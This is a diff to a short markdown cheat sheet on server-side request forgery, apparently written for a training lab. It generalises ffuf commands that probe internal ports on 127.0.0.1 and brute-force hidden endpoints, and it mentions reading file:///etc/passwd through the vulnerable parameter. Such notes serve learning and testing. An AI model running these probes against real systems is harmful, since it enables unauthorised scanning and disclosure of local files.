@@ -22,14 +22,14 @@ We can do this using a fuzzer like ffuf.
 seq 1 10000 > ports.txt
 ```
 ```
-ffuf -w ./ports.txt -u http://$ip/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&<other_values_if_any>" -fr "<response_identifier_for_closed_port>"
+ffuf -w ./ports.txt -u http://$ip/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "variable=http://127.0.0.1:FUZZ/&<other_values_if_any>" -fr "<response_identifier_for_closed_port>"
 ```
 *Note: First check the error message in case of a closed port to apply the `-fr` regex filter correctly.*
 
 ## Accessing Restricted Endpoints
 First determine the web server's response when we access a non-existing page. We should also find the correct extension of the files as we can see in the `$extension` variable.
 ```
-ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://$ip/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.$extension&<other_values_if_any>" -fr "<response_identifier_for_non_existing_page>"
+ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://$ip/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "variable=http://$domain/FUZZ.$extension&<other_values_if_any>" -fr "<response_identifier_for_non_existing_page>"
 ```
 ## Local File Inclusion (LFI)
 We can attempt to read local files from the file system using the `file://` URL scheme. E.g. by supplying the URL `file:///etc/passwd`
